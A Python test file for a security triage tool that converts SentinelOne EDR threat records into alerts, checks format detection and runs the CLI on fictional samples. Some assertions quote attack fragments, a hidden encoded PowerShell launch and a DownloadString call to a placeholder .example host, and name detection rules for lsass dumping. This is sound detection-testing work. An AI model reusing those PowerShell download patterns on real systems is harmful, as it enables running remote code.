"""Tests for the SentinelOne threat adapter (adapters/s1_threat.py), format detection, and lists."""

import copy
import json
from pathlib import Path

import httpx
import pytest
import respx

import adapters
import cli
from adapters import s1_threat
from adapters.common import UNKNOWN_HOST
from models import Alert, SourceDetection
from triage import triage

ALERTS_DIR = Path(__file__).parent.parent / "alerts"
SAMPLE = ALERTS_DIR / "s1_threat_sample.json"
OCSF_SAMPLE = ALERTS_DIR / "ocsf_clipboard_stager.json"


def load_sample() -> dict:
    return json.loads(SAMPLE.read_text())


def first_threat() -> dict:
    return load_sample()["data"][0]


def threat(**info) -> dict:
    """A minimal SentinelOne threat."""
    return {"agentRealtimeInfo": {"agentComputerName": "WS-TEST-01"}, "threatInfo": info}


# --- The fictional sample ------------------------------------------------------

def test_sample_threat_converts_to_expected_alert():
    alert = s1_threat.to_alert(first_threat())

    assert alert == Alert(
        hostname="WS-FIN-0144",
        user="LAB\\d.okafor",
        sha256=alert.sha256,  # Checked separately below.
        file_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line=alert.command_line,
        parent_process="WINWORD.EXE",
        source_detection=SourceDetection(
            title="powershell.exe",
            classification="Malware",
            confidence="malicious",
            analytic="Behavioral AI",
            storyline="5A7C1E0F3B9D2468",
            indicators=[
                "Exploitation: An Office application started PowerShell",
                "Evasion: PowerShell ran an encoded command",
                "General: Downloaded content from the network and ran it in memory",
            ],
        ),
    )
    assert len(alert.sha256) == 64 and alert.sha256 == alert.sha256.lower()
    assert alert.command_line.startswith("powershell.exe -nop -w hidden -enc ")


def test_sample_threats_triage_as_expected():
    # The fictional hashes are "not found" on VirusTotal; nothing else is looked up.
    with respx.mock(assert_all_called=False) as mock:
        mock.get(url__startswith="https://www.virustotal.com/").mock(return_value=httpx.Response(404))
        results = [triage(s1_threat.to_alert(t)) for t in load_sample()["data"]]

    assert [r.alert.hostname for r in results] == ["WS-FIN-0144", "WS-ENG-0207", "SRV-LAB-0003"]
    word_macro, invoice, lsass = results

    assert word_macro.verdict == "malicious"
    assert "office_spawns_shell" in {f.rule_id for f in word_macro.behavior_findings}
    assert "DownloadString('https://cdn.invoice-portal.example/q3.ps1')" in word_macro.decoded_command

    # The EDR calls it a Trojan; our rules only see a program run from Downloads.
    assert invoice.alert.source_detection.classification == "Trojan"
    assert {f.rule_id for f in invoice.behavior_findings} == {"user_writable_execution"}

    assert lsass.verdict == "malicious"
    assert "lsass_dump" in {f.rule_id for f in lsass.behavior_findings}


def test_sample_uses_only_fictional_values():
    text = SAMPLE.read_text()
    sample = load_sample()

    assert "(fictional)" in text
    assert "http" not in text  # The only URL is inside the encoded command, on a .example host.
    for t in sample["data"]:
        assert t["agentDetectionInfo"]["agentIpV4"].startswith("192.0.2.")  # TEST-NET-1
        assert t["agentDetectionInfo"]["externalIp"].startswith("198.51.100.")  # TEST-NET-2
        assert t["agentDetectionInfo"]["agentUuid"].startswith("00000000-0000-4000-8000-")


# --- Field mapping -------------------------------------------------------------

def test_hostname_falls_back_to_agent_detection_info():
    data = {"agentDetectionInfo": {"agentComputerName": "SRV-LAB-0003"}, "threatInfo": {}}

    assert s1_threat.to_alert(data).hostname == "SRV-LAB-0003"


def test_realtime_hostname_is_preferred():
    data = {
        "agentRealtimeInfo": {"agentComputerName": "WS-NOW-01"},
        "agentDetectionInfo": {"agentComputerName": "WS-THEN-01"},
        "threatInfo": {},
    }

    assert s1_threat.to_alert(data).hostname == "WS-NOW-01"


def test_device_paths_are_normalized():
    alert = s1_threat.to_alert(threat(
        filePath=r"\Device\HarddiskVolume4\Users\a\x.exe",
        maliciousProcessArguments=r'"\Device\HarddiskVolume4\Users\a\x.exe" --run',
    ))

    assert alert.file_path == r"C:\Users\a\x.exe"
    assert alert.command_line == r'"C:\Users\a\x.exe" --run'


def test_sha256_is_lowercased():
    assert s1_threat.to_alert(threat(sha256=" " + "AB" * 32)).sha256 == "ab" * 32


def test_engines_list_is_used_without_detection_engines():
    detection = s1_threat.to_alert(threat(engines=["On-Write Static AI", "", 7, "SentinelOne Cloud"])).source_detection

    assert detection.analytic == "On-Write Static AI, SentinelOne Cloud"


def test_detection_engine_titles_are_preferred():
    data = threat(detectionEngines=[{"key": "x", "title": "Behavioral AI"}], engines=["Ignored"])

    assert s1_threat.to_alert(data).source_detection.analytic == "Behavioral AI"


def test_indicators_are_capped_and_shortened():
    data = threat(threatName="x.exe")
    data["indicators"] = [{"category": "Evasion", "description": "d" * 500}] + [
        {"description": f"indicator {i}"} for i in range(20)
    ]

    indicators = s1_threat.to_alert(data).source_detection.indicators

    assert len(indicators) == s1_threat.MAX_INDICATORS
    assert len(indicators[0]) == s1_threat.MAX_INDICATOR_LENGTH
    assert indicators[0].startswith("Evasion: ddd") and indicators[0].endswith("…")
    assert indicators[1] == "indicator 0"


def test_indicator_with_only_a_category_is_kept():
    data = {**threat(), "indicators": [{"category": "Persistence"}, {"ids": [1]}]}

    assert s1_threat.to_alert(data).source_detection.indicators == ["Persistence"]


# --- Partial and malformed input never crashes ---------------------------------

def test_partial_threat_keeps_what_is_there():
    alert = s1_threat.to_alert(threat(sha256="ab" * 32, classification="Ransomware"))

    assert alert.hostname == "WS-TEST-01"
    assert alert.sha256 == "ab" * 32
    assert alert.user is alert.command_line is alert.file_path is alert.parent_process is None
    assert alert.source_detection == SourceDetection(classification="Ransomware")


@pytest.mark.parametrize("data", [
    {"threatInfo": {}},
    {"threatInfo": {}, "agentRealtimeInfo": None, "agentDetectionInfo": "WS-01", "indicators": None},
    {"threatInfo": {"sha256": 12, "filePath": [], "processUser": {}, "maliciousProcessArguments": "   "}},
    {"threatInfo": {"originatorProcess": None, "engines": "Behavioral AI", "detectionEngines": [None, "x", {"title": 3}]}},
    {"threatInfo": {}, "agentRealtimeInfo": {"agentComputerName": 99}, "indicators": [None, 7, "x", {"category": []}]},
])
def test_malformed_threat_gives_an_alert_with_nones(data):
    alert = s1_threat.to_alert(data)

    assert alert.hostname == UNKNOWN_HOST
    assert alert.user is alert.sha256 is alert.command_line is alert.file_path is alert.parent_process is None
    assert alert.source_detection is None


# --- Format detection and splitting -------------------------------------------

@pytest.mark.parametrize("data, expected", [
    ({"threatInfo": {}}, "s1_threat"),
    (first_threat(), "s1_threat"),
    ({"finding_info": {}, "evidences": []}, "ocsf"),
    (json.loads(OCSF_SAMPLE.read_text()), "ocsf"),
    ({"hostname": "WS-01"}, "native"),
    ({"threatInfo": "not a dict"}, "native"),  # Then the caller's validation rejects it.
    ({"agentRealtimeInfo": {}}, "native"),
    ([{"threatInfo": {}}], "native"),  # Lists are split first; detection sees one alert.
    ("threatInfo", "native"),
])
def test_detect_format(data, expected):
    assert adapters.detect_format(data) == expected


@pytest.mark.parametrize("data, expected", [
    ([{"hostname": "A"}, {"hostname": "B"}], [{"hostname": "A"}, {"hostname": "B"}]),
    ([], []),
    ({"data": [{"threatInfo": {}}], "pagination": {}}, [{"threatInfo": {}}]),
    ({"data": []}, []),
    ({"hostname": "WS-01"}, None),
    ({"threatInfo": {}}, None),
    ({"data": {"threatInfo": {}}}, None),  # Not a list: treated as one (invalid) alert.
    ("text", None),
])
def test_split(data, expected):
    assert adapters.split(data) == expected


def test_alert_fields_converts_s1_threats():
    fields = adapters.alert_fields(first_threat())

    assert fields["hostname"] == "WS-FIN-0144"
    assert fields["source_detection"]["confidence"] == "malicious"
    assert "remote_ip" not in fields  # None values are left out.


def test_source_detection_json_leaves_out_what_the_edr_did_not_say():
    assert SourceDetection(title="x", severity="High").model_dump() == {"title": "x", "severity": "High"}
    assert SourceDetection().model_dump() == {}


# --- CLI ----------------------------------------------------------------------

@pytest.fixture
def run_cli(monkeypatch, capsys):
    monkeypatch.setattr(cli, "load_dotenv", lambda: None)  # Never read .env in tests.

    def run(path: Path) -> tuple[int, str, str]:
        monkeypatch.setattr("sys.argv", ["cli.py", str(path)])
        with respx.mock(assert_all_called=False) as mock:
            mock.get(url__startswith="https://www.virustotal.com/").mock(return_value=httpx.Response(404))
            code = cli.main()
        out, err = capsys.readouterr()
        return code, out, err

    return run


def test_cli_triages_every_threat_in_an_api_response(run_cli):
    code, out, _ = run_cli(SAMPLE)

    assert code == 0
    assert out.count("Detected: SentinelOne threat") == 3
    assert "Alert 3 of 3" in out
    assert "EDR said: powershell.exe (Malware, malicious confidence, Behavioral AI)" in out
    assert "Storyline: 5A7C1E0F3B9D2468" in out
    summary = out.split("SUMMARY: 3 alerts")[1]
    assert summary.index("WS-FIN-0144") < summary.index("WS-ENG-0207") < summary.index("SRV-LAB-0003")


def test_cli_triages_a_plain_list_of_mixed_formats(run_cli, tmp_path):
    path = tmp_path / "mixed.json"
    path.write_text(json.dumps([{"hostname": "WS-01"}, first_threat(), json.loads(OCSF_SAMPLE.read_text())]))

    code, out, _ = run_cli(path)

    assert code == 0
    assert "Detected: native" in out
    assert "Detected: SentinelOne threat" in out
    assert "Detected: SentinelOne OCSF" in out
    assert "SUMMARY: 3 alerts" in out


def test_cli_single_alert_has_no_summary(run_cli, tmp_path):
    path = tmp_path / "one.json"
    path.write_text(json.dumps(first_threat()))

    code, out, _ = run_cli(path)

    assert code == 0
    assert "Detected: SentinelOne threat" in out
    assert "SUMMARY" not in out and "Alert 1 of" not in out


def test_cli_names_the_bad_alert_in_a_list(run_cli, tmp_path):
    path = tmp_path / "bad.json"
    path.write_text(json.dumps([{"hostname": "WS-01"}, {"user": "no hostname"}]))

    code, _, err = run_cli(path)

    assert code == 1
    assert "alert 2 in" in err


def test_cli_rejects_an_empty_list(run_cli, tmp_path):
    path = tmp_path / "empty.json"
    path.write_text(json.dumps({"data": [], "pagination": {}}))

    code, _, err = run_cli(path)

    assert code == 1
    assert "has no alerts" in err


def test_sample_is_not_modified_by_conversion():
    data = load_sample()
    before = copy.deepcopy(data)

    for t in data["data"]:
        s1_threat.to_alert(t)

    assert data == before


def test_original_file_name_is_mapped_when_present():
    alert = s1_threat.to_alert(threat(filePath=r"C:\Users\Public\cu.exe", **{s1_threat.ORIGINAL_NAME_KEY: "certutil.exe"}))

    assert alert.original_file_name == "certutil.exe"
    assert "renamed_system_binary" in {f.rule_id for f in triage(alert).behavior_findings}


def test_original_file_name_is_none_when_absent():
    assert all(s1_threat.to_alert(t).original_file_name is None for t in load_sample()["data"])
